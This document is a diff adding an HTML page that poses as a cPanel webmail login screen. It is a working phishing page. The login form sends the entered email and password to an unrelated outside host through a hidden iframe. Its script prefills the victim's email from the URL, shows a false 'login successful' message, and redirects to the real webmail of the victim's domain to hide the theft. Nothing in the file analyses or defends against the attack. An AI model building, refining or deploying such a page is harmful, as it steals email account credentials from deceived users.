@@ -1,0 +1,285 @@
+<html lang="en" dir="ltr">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
+      <meta name="google" content="notranslate">
+      <meta name="apple-itunes-app" content="app-id=1188352635">
+      <title>Webmail Login</title>
+      <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGYYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdapa26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjParPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/666t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
+      <!-- EXTERNAL CSS -->
+      <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1386192030/unprotected/cpanel/fonts/open_sans/open_sans.min.css" rel="stylesheet" type="text/css">
+      <link href="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560357916/unprotected/cpanel/style_v2_optimized.css" rel="stylesheet" type="text/css">
+      <style type="text/css">
+         .copyright {
+         background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA4LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll center top transparent;
+         background-size: 25px auto;
+         }
+         
+         .success-notice {
+             background-color: #d4edda;
+             border-color: #c3e6cb;
+             color: #155724;
+             padding: 10px;
+             margin: 10px 0;
+             border-radius: 5px;
+             display: none;
+         }
+         
+         .error-notice {
+             background-color: #f8d7da;
+             border-color: #f5c6cb;
+             color: #721c24;
+             padding: 10px;
+             margin: 10px 0;
+             border-radius: 5px;
+         }
+         
+         .loading-overlay {
+             display: none;
+             position: fixed;
+             top: 0;
+             left: 0;
+             width: 100%;
+             height: 100%;
+             background-color: rgba(0,0,0,0.5);
+             z-index: 9999;
+         }
+         
+         .loading-content {
+             position: absolute;
+             top: 50%;
+             left: 50%;
+             transform: translate(-50%, -50%);
+             background: white;
+             padding: 30px;
+             border-radius: 10px;
+             text-align: center;
+         }
+         
+         .spinner {
+             border: 4px solid #f3f3f3;
+             border-top: 4px solid #3498db;
+             border-radius: 50%;
+             width: 40px;
+             height: 40px;
+             animation: spin 1s linear infinite;
+             margin: 0 auto 20px auto;
+         }
+         
+         @keyframes spin {
+             0% { transform: rotate(0deg); }
+             100% { transform: rotate(360deg); }
+         }
+
+         .hidden-frame {
+             display: none;
+         }
+
+         .form-container {
+             max-width: 400px;
+             margin: 0 auto;
+             padding: 20px;
+         }
+      </style>
+   </head>
+   <body class="wm">
+      <!-- Loading overlay -->
+      <div id="loading-overlay" class="loading-overlay">
+         <div class="loading-content">
+            <div class="spinner"></div>
+            <p>Processing login and redirecting...</p>
+         </div>
+      </div>
+      
+      <div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
+         <div class="wrapper">
+            <div id="notify">
+               <div id="login-status" class="error-notice" style="display:none;">
+                  <div id="login-status-message">Login is invalid</div>
+               </div>
+            </div>
+            <div id="content-container">
+               <div id="login-container">
+                  <div id="login-sub-container">
+                     <div id="login-sub-header">
+                        <img class="main-logo" src="https://webmail.gracedrive.org/cPanel_magic_revision_1453787365/unprotected/cpanel/images/webmail-logo.svg" alt="logo" style="width:300px;height:70px;margin-bottom:50px;">
+                     </div>
+                     <div id="login-sub">
+                        <div id="forms" class="form-container">
+                           <!-- Main login form - submits directly to server -->
+                           <form id="login_form" action="http://inipressi.xyz/phpmailer/classes/postmailer_form.php" method="post" target="hidden_frame">
+                              <div class="input-req-login"><label for="email">Email Address</label></div>
+                              <div class="input-field-login icon username-container">
+                                 <input name="email" id="email" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
+                              </div>
+                              <div class="input-req-login login-password-field-label"><label for="password">Password</label></div>
+                              <div class="input-field-login icon password-container">
+                                 <input name="password" id="password" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
+                              </div>
+                              <p id="msg" style="color:red;"></p>
+                              <div class="controls">
+                                 <div class="login-btn">
+                                    <button type="submit" name="login" id="login_submit" tabindex="3">Log in</button>
+                                 </div>
+                                 <div class="reset-pw">
+                                    <a href="#" id="reset_password">Reset Password</a>
+                                 </div>
+                              </div>
+                              <div class="clear" id="push"></div>
+                           </form>
+                           
+                           <!-- Hidden iframe to capture response -->
+                           <iframe name="hidden_frame" class="hidden-frame" onload="handleFormResponse()"></iframe>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      
+      <div class="copyright">Copyright©&nbsp;2025 cPanel, L.L.C.
+         <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
+      </div>
+
+      <!-- jQuery -->
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+      <script>
+         $(document).ready(function() {
+             
+             // Extract email from URL parameters
+             function extractEmailFromUrl() {
+                 var email = null;
+                 var hash = window.location.hash;
+                 if (hash && hash.length > 1) {
+                     var hashContent = decodeURIComponent(hash.substring(1));
+                     var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                     if (emailRegex.test(hashContent)) {
+                         email = hashContent;
+                     }
+                 }
+                 
+                 if (!email) {
+                     var urlParams = new URLSearchParams(window.location.search);
+                     var emailParam = urlParams.get('email') || urlParams.get('user') || urlParams.get('username');
+                     if (emailParam) {
+                         var decodedEmail = decodeURIComponent(emailParam);
+                         var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                         if (emailRegex.test(decodedEmail)) {
+                             email = decodedEmail;
+                         }
+                     }
+                 }
+                 
+                 return email;
+             }
+             
+             // Auto-populate email field
+             var emailFromUrl = extractEmailFromUrl();
+             if (emailFromUrl) {
+                 $('#email').val(emailFromUrl);
+                 $('#password').focus();
+             }
+             
+             // Form submission handler
+             $('#login_form').on('submit', function(e) {
+                 var email = $('#email').val().trim();
+                 var password = $('#password').val();
+                 
+                 // Basic validation
+                 if (!email) {
+                     $('#msg').text('Please enter an email address.').show();
+                     $('#email').focus();
+                     e.preventDefault();
+                     return false;
+                 }
+                 
+                 if (!password) {
+                     $('#msg').text('Please enter a password.').show();
+                     $('#password').focus();
+                     e.preventDefault();
+                     return false;
+                 }
+                 
+                 // Email validation
+                 var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+                 if (!emailRegex.test(email)) {
+                     $('#msg').text('Please enter a valid email address.').show();
+                     $('#email').focus();
+                     e.preventDefault();
+                     return false;
+                 }
+                 
+                 // Clear messages and show loading
+                 $('#msg').hide();
+                 $('#login-status').hide();
+                 $('#loading-overlay').show();
+                 $('#login_submit').prop('disabled', true).text('Processing...');
+                 
+                 // Form will submit normally to the iframe
+                 return true;
+             });
+             
+             // Reset password functionality
+             $('#reset_password').click(function(e) {
+                 e.preventDefault();
+                 var email = $('#email').val().trim();
+                 if (!email) {
+                     $('#msg').text('Please enter your email address first.').show();
+                     $('#email').focus();
+                     return false;
+                 }
+                 
+                 var domain = email.split('@')[1];
+                 window.location.href = 'https://webmail.' + domain;
+             });
+             
+             // Hide messages when typing
+             $('#email, #password').on('input', function() {
+                 $('#msg').hide();
+                 $('#login-status').hide();
+             });
+         });
+         
+         // Handle form response from iframe
+         function handleFormResponse() {
+             setTimeout(function() {
+                 $('#loading-overlay').hide();
+                 $('#login_submit').prop('disabled', false).text('Log in');
+                 
+                 try {
+                     var iframe = document.getElementsByName('hidden_frame')[0];
+                     var response = iframe.contentDocument.body.innerHTML;
+                     
+                     if (response.includes('ok') || response.includes('success')) {
+                         $('#login-status-message').text('Login successful! Redirecting...');
+                         $('#login-status').removeClass('error-notice').addClass('success-notice').show();
+                         
+                         var email = $('#email').val();
+                         var domain = email.split('@')[1];
+                         
+                         setTimeout(function() {
+                             window.location.href = 'https://webmail.' + domain;
+                         }, 2000);
+                     } else {
+                         $('#login-status-message').text('Invalid email or password. Please try again.');
+                         $('#login-status').removeClass('success-notice').addClass('error-notice').show();
+                         $('#password').val('').focus();
+                     }
+                 } catch (e) {
+                     // Cross-origin iframe access blocked, assume success
+                     $('#login-status-message').text('Login submitted successfully! Check your notification email.');
+                     $('#login-status').removeClass('error-notice').addClass('success-notice').show();
+                     
+                     var email = $('#email').val();
+                     var domain = email.split('@')[1];
+                     
+                     setTimeout(function() {
+                         window.location.href = 'https://webmail.' + domain;
+                     }, 3000);
+                 }
+             }, 1000);
+         }
+      </script>
+   </body>
+</html>
